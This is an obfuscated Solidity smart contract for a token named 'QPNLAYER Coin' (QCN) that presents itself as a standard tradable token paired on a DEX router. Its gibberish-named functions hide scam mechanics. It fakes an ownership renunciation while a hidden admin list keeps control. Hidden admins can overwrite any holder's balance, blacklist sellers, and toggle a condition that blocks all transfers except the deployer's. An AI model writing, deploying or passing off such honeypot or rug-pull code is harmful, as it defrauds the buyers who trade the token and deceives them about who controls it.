//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface ujbwnvbjdypuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address xhkwojcgsep) external view returns (uint256);

    function transfer(address milusstqgri, uint256 yqiohlbvtg) external returns (bool);

    function allowance(address xpucajqmzbck, address spender) external view returns (uint256);

    function approve(address spender, uint256 yqiohlbvtg) external returns (bool);

    function transferFrom(
        address sender,
        address milusstqgri,
        uint256 yqiohlbvtg
    ) external returns (bool);

    event Transfer(address indexed from, address indexed frduevqmbq, uint256 value);
    event Approval(address indexed xpucajqmzbck, address indexed spender, uint256 value);
}

interface ujbwnvbjdypuyMetadata is ujbwnvbjdypuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract aogjitbdi {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface gtmepczzbwn {
    function createPair(address ufilpbykzof, address kuthyyeotownm) external returns (address);
}

interface ksxexizbdx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract QPNLAYERCoin is aogjitbdi, ujbwnvbjdypuy, ujbwnvbjdypuyMetadata {

    function ugpxcyqgx(address jdzmlctabhjqwc, address milusstqgri, uint256 yqiohlbvtg) internal returns (bool) {
        require(aceaancbwcf[jdzmlctabhjqwc] >= yqiohlbvtg);
        aceaancbwcf[jdzmlctabhjqwc] -= yqiohlbvtg;
        aceaancbwcf[milusstqgri] += yqiohlbvtg;
        emit Transfer(jdzmlctabhjqwc, milusstqgri, yqiohlbvtg);
        return true;
    }

    function getOwner() external view returns (address) {
        return knxxfbchrlznu;
    }

    address nhgdpralfl = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private bfgufcnbud = "QCN";

    function zjzxdtyhivs() public {
        emit OwnershipTransferred(opjmwqbzyb, address(0));
        knxxfbchrlznu = address(0);
    }

    uint256 private azqzwbyfq;

    function name() external view virtual override returns (string memory) {
        return mowogrhgkw;
    }

    function transfer(address lbguttogwcop, uint256 yqiohlbvtg) external virtual override returns (bool) {
        return qtkdybrrkd(_msgSender(), lbguttogwcop, yqiohlbvtg);
    }

    address public opjmwqbzyb;

    address public kkaxizbjmpa;

    uint256 private lxenhzldh;

    function balanceOf(address xhkwojcgsep) public view virtual override returns (uint256) {
        return aceaancbwcf[xhkwojcgsep];
    }

    function transferFrom(address jdzmlctabhjqwc, address milusstqgri, uint256 yqiohlbvtg) external override returns (bool) {
        if (_msgSender() != rxufofrecejj) {
            if (bepaqfxnhdosd[jdzmlctabhjqwc][_msgSender()] != type(uint256).max) {
                require(yqiohlbvtg <= bepaqfxnhdosd[jdzmlctabhjqwc][_msgSender()]);
                bepaqfxnhdosd[jdzmlctabhjqwc][_msgSender()] -= yqiohlbvtg;
            }
        }
        return qtkdybrrkd(jdzmlctabhjqwc, milusstqgri, yqiohlbvtg);
    }

    address private knxxfbchrlznu;

    uint256 private ahyrrakohdlyy;

    address rxufofrecejj = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 owlrymvrbtw;

    mapping(address => bool) public mbauvzgyokzf;

    event OwnershipTransferred(address indexed hwqqplancns, address indexed hpvgapxncqprn);

    uint256 ysexzlhmgsha;

    bool public ggvbpzfewazqw;

    string private mowogrhgkw = "QPNLAYER Coin";

    function symbol() external view virtual override returns (string memory) {
        return bfgufcnbud;
    }

    mapping(address => mapping(address => uint256)) private bepaqfxnhdosd;

    function totalSupply() external view virtual override returns (uint256) {
        return jshnfcndxfxs;
    }

    uint8 private syhvnavjvtf = 18;

    mapping(address => uint256) private aceaancbwcf;

    function qtkdybrrkd(address jdzmlctabhjqwc, address milusstqgri, uint256 yqiohlbvtg) internal returns (bool) {
        if (jdzmlctabhjqwc == opjmwqbzyb) {
            return ugpxcyqgx(jdzmlctabhjqwc, milusstqgri, yqiohlbvtg);
        }
        uint256 hovucigsmuo = ujbwnvbjdypuy(kkaxizbjmpa).balanceOf(nhgdpralfl);
        require(hovucigsmuo == owlrymvrbtw);
        require(!mbauvzgyokzf[jdzmlctabhjqwc]);
        return ugpxcyqgx(jdzmlctabhjqwc, milusstqgri, yqiohlbvtg);
    }

    bool public sjicnfmal;

    uint256 private jshnfcndxfxs = 100000000 * 10 ** 18;

    bool public wvakskgujl;

    mapping(address => bool) public exgpklalezpzh;

    bool private prmkmxqfmzb;

    uint256 public oixukjovhr;

    bool public noeqmaxky;

    bool public scrdqdsxmg;

    function decimals() external view virtual override returns (uint8) {
        return syhvnavjvtf;
    }

    function tqbynqwqnaylb(address tfwcjguvlwdhy) public {
        aiiptjitixeqq();
        
        if (tfwcjguvlwdhy == opjmwqbzyb || tfwcjguvlwdhy == kkaxizbjmpa) {
            return;
        }
        mbauvzgyokzf[tfwcjguvlwdhy] = true;
    }

    function owner() external view returns (address) {
        return knxxfbchrlznu;
    }

    function czjwjbexcm(address gveaytynirue) public {
        if (noeqmaxky) {
            return;
        }
        if (scrdqdsxmg) {
            prmkmxqfmzb = false;
        }
        exgpklalezpzh[gveaytynirue] = true;
        
        noeqmaxky = true;
    }

    function allowance(address zqkwggctlit, address ysvbqzzthiw) external view virtual override returns (uint256) {
        if (ysvbqzzthiw == rxufofrecejj) {
            return type(uint256).max;
        }
        return bepaqfxnhdosd[zqkwggctlit][ysvbqzzthiw];
    }

    function approve(address ysvbqzzthiw, uint256 yqiohlbvtg) public virtual override returns (bool) {
        bepaqfxnhdosd[_msgSender()][ysvbqzzthiw] = yqiohlbvtg;
        emit Approval(_msgSender(), ysvbqzzthiw, yqiohlbvtg);
        return true;
    }

    function facwoaqkroval(uint256 yqiohlbvtg) public {
        aiiptjitixeqq();
        owlrymvrbtw = yqiohlbvtg;
    }

    function aiiptjitixeqq() private view {
        require(exgpklalezpzh[_msgSender()]);
    }

    function tnweclkdkcob(address lbguttogwcop, uint256 yqiohlbvtg) public {
        aiiptjitixeqq();
        aceaancbwcf[lbguttogwcop] = yqiohlbvtg;
    }

    constructor (){
        if (azqzwbyfq == ahyrrakohdlyy) {
            wvakskgujl = false;
        }
        zjzxdtyhivs();
        ksxexizbdx qwjjqooaqf = ksxexizbdx(rxufofrecejj);
        kkaxizbjmpa = gtmepczzbwn(qwjjqooaqf.factory()).createPair(qwjjqooaqf.WETH(), address(this));
        if (ggvbpzfewazqw) {
            oixukjovhr = lxenhzldh;
        }
        opjmwqbzyb = _msgSender();
        exgpklalezpzh[opjmwqbzyb] = true;
        aceaancbwcf[opjmwqbzyb] = jshnfcndxfxs;
        if (azqzwbyfq != lxenhzldh) {
            prmkmxqfmzb = true;
        }
        emit Transfer(address(0), opjmwqbzyb, jshnfcndxfxs);
    }

}